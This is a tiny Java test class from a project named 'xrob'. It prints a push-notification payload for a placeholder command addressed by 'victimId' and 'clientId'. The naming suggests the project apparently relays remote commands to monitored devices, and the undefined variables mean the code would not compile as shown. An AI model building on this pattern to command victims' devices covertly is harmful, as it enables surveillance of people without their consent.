package com.theah64.xrob.api;


import com.theah64.xrob.api.models.Command;

/**
 * Created by theapache64 on 10/13/2015.
 */
public class TestMain {


    public static void main(String[] args) {

        System.out.println(Command.toFcmPayload("theFcmId", new Command("1", "thecommand", 0, null, victimId1, clientId1)));
    }


}

